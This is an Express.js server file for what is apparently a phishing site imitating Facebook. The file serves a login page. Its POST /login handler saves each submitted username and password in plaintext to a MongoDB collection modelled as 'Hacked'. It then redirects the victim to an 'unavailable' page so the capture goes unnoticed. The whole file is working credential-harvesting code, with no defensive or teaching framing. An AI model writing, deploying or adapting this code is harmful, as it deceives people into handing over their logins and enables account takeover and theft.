if (process.env.NODE_ENV !== "production") {
  require("dotenv").config();
}

const express = require("express");
const mongoose = require("mongoose");
const Hacked = require("./models/hacked");
const ejs = require("ejs");
const path = require("path");
const ejsMate = require("ejs-mate");

const app = express();
// const dbUrl = "mongodb://localhost:27017/hacked"; //FOR DEVELOPMENT MODE
const DBUrl = process.env.DBURL; //FOR PRODUCTION

mongoose.connect(DBUrl, {
  useNewUrlParser: true,
  useCreateIndex: true,
  useUnifiedTopology: true,
  useFindAndModify: false,
});

const db = mongoose.connection;
db.on("error", console.error.bind(console, "connection error:"));
db.once("open", () => {
  console.log("Database connected!!");
});

app.engine("ejs", ejsMate);
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "/views"));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));
app.use(express.static(path.join(__dirname, "images")));

const imgList = ["/0.png", "/1.png", "/2.png", "/3.png", "/4.png"];

app.get("/", (req, res) => {
  res.render("login", { imgList });
});

app.get("/unavailable", (req, res) => {
  res.render("unavailable");
});

app.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body;
    const hacked = new Hacked({ user: username, password });
    await hacked.save();
    res.redirect("/unavailable");
  } catch (error) {
    res.send("Missing Credentials! Try Again");
    // res.send({error});
  }
});

app.get("/facebook", (req, res) => {
  res.render("facebook");
});

app.use("*", (req, res) => {
  res.send("<h1>Page Not Found!</h1>");
});

port = process.env.PORT || 8000;
app.listen(port, () => {
  console.log("SERVER STARTED");
});